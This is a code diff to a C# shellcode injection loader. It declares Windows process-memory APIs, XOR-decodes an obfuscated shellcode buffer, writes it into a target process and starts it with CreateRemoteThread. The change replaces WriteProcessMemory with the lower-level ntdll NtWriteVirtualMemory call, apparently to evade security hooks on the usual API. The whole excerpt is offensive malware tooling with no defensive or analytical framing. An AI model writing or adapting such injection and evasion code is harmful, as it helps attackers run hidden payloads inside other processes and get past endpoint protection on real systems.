@@ -27,16 +27,16 @@
                   uint AllocationType,
                   uint Protect);
 
-              [DllImport("kernel32.dll", SetLastError = true)]
-              static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+              [DllImport("ntdll.dll", SetLastError = true)]
+              static extern int NtWriteVirtualMemory(
+                  IntPtr hProcess,
+                  IntPtr BaseAddress,
+                  byte[] Buffer,
+                  uint Size,
+                  out uint NumberOfBytesWritten);
 
               [DllImport("kernel32.dll", SetLastError = true)]
-              static extern bool WriteProcessMemory(
-                  IntPtr hProcess,
-                  IntPtr lpBaseAddress,
-                  byte[] lpBuffer,
-                  uint nSize,
-                  out IntPtr lpNumberOfBytesWritten);
+              static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 
               [DllImport("kernel32.dll", SetLastError = true)]
               static extern IntPtr CreateRemoteThread(
@@ -79,8 +79,8 @@
                         shellcode[i] = (byte)((uint)shellcode[i] ^ 0xfa);
                     }
 
-                  IntPtr bytesWritten;
-                  WriteProcessMemory(hProcess, allocAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
+                  uint bytesWritten;
+                  NtWriteVirtualMemory(hProcess, allocAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
 
                   // Step 5: Execute the shellcode
                   IntPtr threadId;
